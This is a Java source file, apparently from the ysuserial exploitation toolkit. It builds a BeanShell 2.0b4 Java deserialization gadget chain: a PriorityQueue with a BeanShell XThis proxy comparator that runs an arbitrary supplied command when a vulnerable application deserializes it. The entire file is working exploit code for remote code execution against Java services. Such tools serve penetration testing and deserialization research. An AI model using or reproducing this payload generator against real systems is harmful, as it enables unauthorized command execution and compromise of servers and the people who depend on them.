package org.su18.ysuserial.payloads;

import bsh.BshClassManager;
import bsh.Interpreter;
import javassist.ClassPool;
import javassist.CtClass;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.BeanShellUtil;

import java.lang.reflect.*;
import java.util.Comparator;
import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.util.Gadgets.insertField;

/**
 * @author su18
 */
@Dependencies({"org.beanshell:bsh:2.0b4"})
public class BeanShell20b4 implements ObjectPayload<PriorityQueue> {

	public PriorityQueue getObject(String command) throws Exception {
		String payload = BeanShellUtil.makeBeanShellPayload(command);

		ClassPool pool = ClassPool.getDefault();

		CtClass ctClass4 = pool.get("bsh.Primitive");
		insertField(ctClass4, "serialVersionUID", "private static final long serialVersionUID = -1164390191642946889L;");
		ctClass4.toClass();

		CtClass ctClass = pool.get("bsh.XThis$Handler");
		insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 4949939576606791809L;");
		Class             handlerClass = ctClass.toClass();
		InvocationHandler handler      = (InvocationHandler) Reflections.createWithoutConstructor(handlerClass);

		CtClass ctClass2 = pool.get("bsh.XThis");
		insertField(ctClass2, "serialVersionUID", "private static final long serialVersionUID = -6803452281441498586L;");
		Class thisClass = ctClass2.toClass();

		CtClass ctClass3 = pool.get("bsh.NameSpace");
		insertField(ctClass3, "serialVersionUID", "private static final long serialVersionUID = -2499232412105981353L;");
		Class       space       = ctClass3.toClass();
		Constructor constructor = space.getConstructor(BshClassManager.class, String.class);

		Interpreter i = new Interpreter();

		Reflections.setFieldValue(i, "evalOnly", false);
		Reflections.setFieldValue(i, "globalNameSpace", constructor.newInstance(BshClassManager.createClassManager(i), "global"));
		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.evalOnly", null});
		Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});
		i.eval(payload);

		Object xt = Reflections.createWithoutConstructor(thisClass);
		Reflections.setFieldValue(xt, "invocationHandler", handler);
		Reflections.setFieldValue(xt, "namespace", i.getNameSpace());
		Reflections.setFieldValue(xt, "declaringInterpreter", i);

		Reflections.setFieldValue(handler, "this$0", xt);

		Comparator<? super Object> comparator    = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);
		PriorityQueue<Object>      priorityQueue = new PriorityQueue(2, comparator);
		Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
		Reflections.setFieldValue(priorityQueue, "queue", queue);
		Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
		return priorityQueue;
	}
}
